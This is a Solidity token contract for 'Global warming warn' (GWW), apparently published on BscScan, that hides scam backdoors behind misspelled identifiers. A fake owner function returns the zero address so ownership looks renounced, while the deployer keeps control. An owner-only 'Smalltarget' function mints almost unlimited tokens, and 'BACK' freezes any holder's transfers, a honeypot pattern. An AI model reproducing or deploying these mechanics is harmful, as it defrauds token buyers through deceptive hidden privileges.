/**
 *Submitted for verification at BscScan.com on 2022-08-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-02
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owmmner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owmmner);
        _;
    }

/**
    * @dev Returns the address of the current owmmner.
     */
    function owmmner() public pure returns (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owmmner, newowneres);
        owmmner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owmmner, address(0));
        owmmner = address(0);
    }
}



contract JINGOU is Ownable {
    using SafeMath for uint256;

    string constant public name = 'Global warming warn';

    string constant public symbol = 'GWW';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 10000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromcfi;

    mapping(address => bool) private _lkck;


    uint256 public _taxcfi = 1;
    uint256 private _previousTaxcfi = _taxcfi;

    uint256 public _burncfi = 1;
    uint256 private _previousBurncfi = _burncfi;


    address public projectAddress = 0x704214940567E67cc45947d7fD1D5F19F4C7BABf;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owmmner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(_isExcludedFromcfi[from])
            removeAllcfi();

        uint256 cfi =  calculateTaxcfi(value);

        uint256 burn =  calculateBurncfi(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(cfi).sub(burn);

        if(cfi > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(cfi);
            emit Transfer(from, projectAddress, cfi);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromcfi[from])
            restoreAllcfi();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function Smalltarget(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxcfi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxcfi).div(
            10 ** 2
        );
    }

    function calculateBurncfi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burncfi).div(
            10 ** 2
        );
    }

    function removeAllcfi() private {
        if(_taxcfi == 0 && _burncfi == 0)
            return;

        _previousTaxcfi = _taxcfi;
        _previousBurncfi = _burncfi;
        _taxcfi = 0;
        _burncfi = 0;
    }

    function restoreAllcfi() private {
        _taxcfi = _previousTaxcfi;
        _burncfi = _previousBurncfi;
    }



    function BACK(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function UNBACK(address account) public onlyowneres {
        _lkck[account] = false;
    }


    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }


}


contract Token is JINGOU {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owmmner = msg.sender;


    }

    function() public payable {
       revert();
    }
}